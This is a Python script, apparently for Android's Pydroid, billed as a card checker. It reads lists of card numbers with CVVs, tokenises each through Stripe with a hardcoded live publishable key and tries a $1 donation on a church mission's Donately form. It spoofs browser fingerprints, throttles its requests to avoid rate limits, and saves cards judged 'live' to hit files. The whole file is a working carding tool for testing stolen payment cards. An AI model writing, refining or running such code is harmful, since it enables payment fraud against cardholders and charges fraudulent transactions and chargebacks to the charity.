"""
Pydroid Card Checker - Stripe Donately Gateway
Reads cards from a txt file and checks them using Stripe API
"""

import requests
import json
import random
import string
import hashlib
import time
import os
import re
from datetime import datetime


class StripeChecker:
    def __init__(self):
        self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        self.account_id = 'act_f9b102ae7299'
        self.form_id = 'frm_5cb29a5d6955'

    def generate_guid(self):
        return '-'.join([
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(3)),
            ''.join(random.choices(string.hexdigits[:16], k=3)) + '4',
            ''.join(random.choices(string.hexdigits[:16], k=3)) + 'a',
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(2))
        ])

    def generate_token(self, card_data):
        url = 'https://api.stripe.com/v1/tokens'
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        post_fields = {
            'card[number]': card_data['cc'],
            'card[cvc]': card_data['cvv'],
            'card[exp_month]': card_data['month'],
            'card[exp_year]': card_data['year'],
            'card[name]': card_data['name'],
            'card[address_country]': 'US',
            'card[currency]': 'USD',
            'guid': self.generate_guid(),
            'muid': self.generate_guid(),
            'sid': self.generate_guid(),
            'payment_user_agent': 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page': random.randint(20000, 50000),
            'key': self.pk_live,
            '_stripe_version': '2022-11-15'
        }

        try:
            response = requests.post(url, headers=headers, data=post_fields, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': {'message': str(e)}}

    def charge_card(self, token, user_data):
        url = f"https://api.donately.com/v2/donations?account_id={self.account_id}&donation_type=cc&amount_in_cents=100&form_id={self.form_id}&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload = {
            'campaign_id': None,
            'fundraiser_id': None,
            'dont_send_receipt_email': False,
            'first_name': user_data['first_name'],
            'last_name': user_data['last_name'],
            'email': user_data['email'],
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json.dumps({'stripe_token': token}),
            'form': json.dumps({
                'version': '5.8.117',
                'id': self.form_id
            })
        }

        try:
            response = requests.post(url, headers=headers, json=payload, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': str(e)}

    def process_card(self, cc, month, year, cvv):
        user_data = {
            'first_name': 'Richard',
            'last_name': 'Biven',
            'email': f'test{random.randint(1000, 9999)}@gmail.com'
        }

        token_response = self.generate_token({
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'name': f"{user_data['first_name']} {user_data['last_name']}"
        })

        if 'id' not in token_response:
            error_msg = token_response.get('error', {}).get('message', 'Unknown error')
            return {
                'success': False,
                'status': 'DECLINED',
                'message': error_msg
            }

        charge_response = self.charge_card(token_response['id'], user_data)
        return charge_response


def extract_card(text):
    """Extract card details from various formats"""
    # Format: cc|mm|yy|cvv or cc|mm|yyyy|cvv
    match = re.search(r'(\d{12,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})', text)
    if match:
        return match.groups()
    return None


def get_status(response):
    """Determine card status from response"""
    response_str = json.dumps(response).upper() if isinstance(response, dict) else str(response).upper()
    
    # Charged/Success indicators
    if any(keyword in response_str for keyword in ['SUCCESS', 'DONATION', 'CHARGED', 'APPROVED', 'THANK YOU']):
        if 'ERROR' not in response_str and 'DECLINED' not in response_str:
            return 'CHARGED'
    
    # CVV/CVC related - Card is Live
    if any(keyword in response_str for keyword in [
        'INCORRECT_CVC', 'INVALID_CVC', 'SECURITY_CODE', 
        'CVV', 'CVC', 'INCORRECT_ZIP', 'ZIP'
    ]):
        return 'CCN'
    
    # 3D Secure - Card is Live
    if any(keyword in response_str for keyword in [
        '3D_SECURE', '3DS', 'AUTHENTICATION', '3D CC'
    ]):
        return 'CCN'
    
    # Insufficient funds - Card is Live
    if 'INSUFFICIENT' in response_str:
        return 'CCN'
    
    return 'DECLINED'


def print_banner():
    """Print the checker banner"""
    banner = """
╔══════════════════════════════════════════════════╗
║        PYDROID CARD CHECKER - STRIPE             ║
║              Donately Gateway                    ║
╠══════════════════════════════════════════════════╣
║  [1] Check cards from file                       ║
║  [2] Check single card                           ║
║  [3] Exit                                        ║
╚══════════════════════════════════════════════════╝
    """
    print(banner)


def check_cards_from_file(file_path):
    """Check multiple cards from a txt file"""
    checker = StripeChecker()
    
    # Create output directory
    output_dir = os.path.dirname(file_path) or '.'
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    hits_file = os.path.join(output_dir, f'hits_{timestamp}.txt')
    declined_file = os.path.join(output_dir, f'declined_{timestamp}.txt')
    ccn_file = os.path.join(output_dir, f'ccn_{timestamp}.txt')
    
    # Read cards from file
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"\n[!] File not found: {file_path}")
        return
    except Exception as e:
        print(f"\n[!] Error reading file: {e}")
        return
    
    # Extract valid cards
    cards = []
    for line in lines:
        line = line.strip()
        if line:
            card_data = extract_card(line)
            if card_data:
                cards.append(card_data)
    
    if not cards:
        print("\n[!] No valid cards found in file!")
        print("[*] Format: cc|mm|yy|cvv or cc|mm|yyyy|cvv")
        return
    
    total = len(cards)
    hits = 0
    declined = 0
    ccn = 0
    
    print(f"\n[*] Found {total} cards to check")
    print(f"[*] Starting checker...\n")
    print("=" * 60)
    
    for idx, (cc, month, year, cvv) in enumerate(cards, 1):
        fullcc = f"{cc}|{month}|{year}|{cvv}"
        
        print(f"\n[{idx}/{total}] Checking: {fullcc}")
        
        start_time = time.time()
        result = checker.process_card(cc, month, year, cvv)
        elapsed = round(time.time() - start_time, 2)
        
        status = get_status(result)
        
        # Get response message
        if isinstance(result, dict):
            if 'message' in result:
                response_msg = result['message']
            elif 'error' in result:
                response_msg = result.get('error', {}).get('message', str(result['error'])) if isinstance(result.get('error'), dict) else str(result.get('error'))
            else:
                response_msg = json.dumps(result)[:100]
        else:
            response_msg = str(result)[:100]
        
        # Display result
        if status == 'CHARGED':
            print(f"[+] STATUS: CHARGED [LIVE]")
            print(f"[+] Response: {response_msg}")
            hits += 1
            with open(hits_file, 'a') as f:
                f.write(f"{fullcc} | CHARGED | {response_msg}\n")
        elif status == 'CCN':
            print(f"[~] STATUS: CCN [LIVE]")
            print(f"[~] Response: {response_msg}")
            ccn += 1
            with open(ccn_file, 'a') as f:
                f.write(f"{fullcc} | CCN | {response_msg}\n")
        else:
            print(f"[-] STATUS: DECLINED")
            print(f"[-] Response: {response_msg}")
            declined += 1
            with open(declined_file, 'a') as f:
                f.write(f"{fullcc} | DECLINED | {response_msg}\n")
        
        print(f"[*] Time: {elapsed}s")
        print("-" * 60)
        
        # Small delay to avoid rate limiting
        time.sleep(random.uniform(1, 2))
    
    # Print summary
    print("\n" + "=" * 60)
    print("                    SUMMARY")
    print("=" * 60)
    print(f"[*] Total Cards: {total}")
    print(f"[+] Charged/Hits: {hits}")
    print(f"[~] CCN (Live): {ccn}")
    print(f"[-] Declined: {declined}")
    print("=" * 60)
    
    if hits > 0:
        print(f"\n[+] Hits saved to: {hits_file}")
    if ccn > 0:
        print(f"[~] CCN saved to: {ccn_file}")
    if declined > 0:
        print(f"[-] Declined saved to: {declined_file}")


def check_single_card():
    """Check a single card"""
    checker = StripeChecker()
    
    print("\n[*] Enter card details")
    print("[*] Format: cc|mm|yy|cvv or cc|mm|yyyy|cvv")
    
    card_input = input("\n> ").strip()
    
    card_data = extract_card(card_input)
    if not card_data:
        print("\n[!] Invalid card format!")
        return
    
    cc, month, year, cvv = card_data
    fullcc = f"{cc}|{month}|{year}|{cvv}"
    
    print(f"\n[*] Checking: {fullcc}")
    print("[*] Please wait...\n")
    
    start_time = time.time()
    result = checker.process_card(cc, month, year, cvv)
    elapsed = round(time.time() - start_time, 2)
    
    status = get_status(result)
    
    print("=" * 60)
    print(f"Card: {fullcc}")
    print(f"Status: {status}")
    print(f"Time: {elapsed}s")
    print("-" * 40)
    print("Response:")
    print(json.dumps(result, indent=2))
    print("=" * 60)


def main():
    """Main function"""
    while True:
        print_banner()
        choice = input("Select option: ").strip()
        
        if choice == '1':
            print("\n[*] Enter path to cards.txt file")
            print("[*] Example: /storage/emulated/0/cards.txt")
            file_path = input("\n> ").strip()
            
            if file_path:
                check_cards_from_file(file_path)
            else:
                print("\n[!] No file path provided!")
                
        elif choice == '2':
            check_single_card()
            
        elif choice == '3':
            print("\n[*] Goodbye!")
            break
            
        else:
            print("\n[!] Invalid option!")
        
        input("\nPress Enter to continue...")


if __name__ == "__main__":
    main()
